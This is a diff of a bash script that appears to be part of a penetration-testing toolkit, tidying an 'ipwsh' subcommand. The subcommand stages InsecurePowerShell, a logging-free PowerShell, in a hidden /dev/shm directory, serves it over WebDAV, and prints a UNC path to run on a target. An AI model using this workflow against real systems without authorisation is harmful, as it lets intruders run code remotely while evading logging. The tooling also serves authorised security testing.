@@ -1,13 +1,9 @@
 ## ipwsh [port]^: Download InsecurePowerShell and serve via davserver
 if [ "$1" == "ipwsh" ]; then
-  echo "[?] Download InsecurePowerShell and serve via davserver?"; prompt
-  if [ ! "$(which davserver)" ]; then
-    echo "[!] 'davserver' required but missing."
-    CMD="sudo pip3 install PyWebDAV3"
-    echo "> $CMD";
-    prompt
-    bash -c "$CMD"
-  fi
+  echo "${ques} Download InsecurePowerShell and serve via davserver?"; prompt
+  CMD="davserver"
+  INSTCMD="sudo pip3 install PyWebDAV3"
+  checkCmd
 
   FPATH="/dev/shm/.fxy/ipwsh"
   if [ -d "$FPATH/pwsh" ]; then
@@ -26,17 +22,17 @@ if [ "$1" == "ipwsh" ]; then
     PORT="$2"
   fi
 
-  echo -e "\n$(tput bold)[*] Run this on your target:"
+  echo -e "\n${info}${txtbld} Run this on your target:"
 
   if [ "$PORT" -eq 80 ]; then
     echo "  \\\\$(getIP)\DavWWWRoot\pwsh\pwsh.exe"
   else
     echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh\pwsh.exe"
   fi
-  echo "$(tput sgr0) "
+  echo "${txtrst}"
 
   CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH -n"
-  echo "> $CMD";
+  echo "${bldwht}> $CMD${txtrst}";
   bash -c "$CMD"
   exit
 fi
